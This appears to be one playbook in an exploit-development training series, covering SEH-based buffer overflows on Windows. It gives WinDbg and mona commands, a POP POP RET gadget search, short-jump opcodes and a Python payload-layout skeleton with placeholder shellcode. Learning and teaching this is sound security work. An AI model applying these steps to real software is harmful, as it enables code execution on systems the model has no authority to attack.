# Playbook: SEH-Based Overflow

**Signature:** EIP is NOT your bytes at first crash. The app catches an exception;
`!exchain` shows the SEH handler is `41414141` (your bytes). You control the
exception handler chain.

## Why SEH works
Windows keeps a linked list of exception handlers on the stack:
`[ nSEH (next record ptr) ][ SEH (handler function ptr) ]`.
Overflow far enough and you overwrite both. When the exception fires, Windows calls
your overwritten SEH pointer. If you point it at a **POP POP RET**, execution returns
into **nSEH** (which you also control) — so nSEH becomes your first instruction.

```
  ... your buffer ...
  [ nSEH  ]  <- 4 bytes you control  → put a SHORT JMP forward here
  [ SEH   ]  <- 4 bytes you control  → put address of POP POP RET
```

## The steps

### 1. Crash, then pass the exception to see SEH
Let the app hit the exception. In WinDbg use `g` to pass it to the handler so the
SEH chain populates, or:
```
!py mona findmsp        ; reports "SEH record ... overwritten, offset to nSEH = XXXX"
!exchain                ; shows the chain
```

### 2. Find offsets to nSEH and SEH
`mona findmsp` gives it directly. Manually: cyclic pattern, read the SEH value,
`msf-pattern_offset -q <SEH value>`. nSEH sits 4 bytes before SEH.

### 3. Find a POP POP RET (the SEH gadget)
Must be in a module with **SafeSEH = False** and **no bad chars**:
```
!py mona seh -cpb "\x00\x0a\x0d"
```
mona lists POP POP RET addresses in SafeSEH-off modules. Pick one. Little-endian into SEH.

### 4. nSEH = short jump over SEH
POP POP RET returns execution to nSEH. You only have 4 bytes there, and the next 4
(SEH) are your gadget address. So jump *over* the SEH field:
```
nSEH = b"\xeb\x06\x90\x90"     # EB 06 = JMP +6 (short jmp forward), padded with NOPs
```
`\xeb\x06` jumps 6 bytes forward, landing just past the SEH pointer, into your shellcode.

### 5. Layout & badchars & shellcode
```python
offset   = 1000                       # to nSEH (from findmsp)
nseh     = b"\xeb\x06\x90\x90"        # short jmp +6
seh      = struct.pack("<I", 0x10012345)   # POP POP RET, little-endian
shellcode= b"\x90"*16 + b"..."        # msfvenom, badchars excluded
buf = b"A"*offset + nseh + seh + shellcode
buf += b"D"*(2000-len(buf))
```
Badchar hunt is identical to the stack BOF playbook (mona bytearray/compare).

## Variations you should recognize
- **Short jump not enough room?** Do a two-stage jump: nSEH does a short jmp back
  into a longer `jmp` you planted earlier, or jump backward into a bigger buffer.
- **Need to jump backward:** compute a negative near jump `\xe9 <rel32>` in nSEH+shellcode.
- **Tiny space after SEH:** combine with an **egghunter** (see that playbook).
- **DEP on:** SEH gets you code exec, but you still need ROP to run shellcode.

## Gotchas
- You must **pass the first-chance exception** (`g` / `gN`) for the SEH to trigger —
  otherwise you're debugging the wrong crash.
- SafeSEH: if every candidate module has SafeSEH on, the POP POP RET must live in a
  **non-SafeSEH, non-ASLR** module — recheck `mona mod`. App-shipped DLLs are gold.
- Little-endian the SEH address; do NOT reverse nSEH (it's raw opcodes).

→ Template: `02-templates/seh_overflow.py`
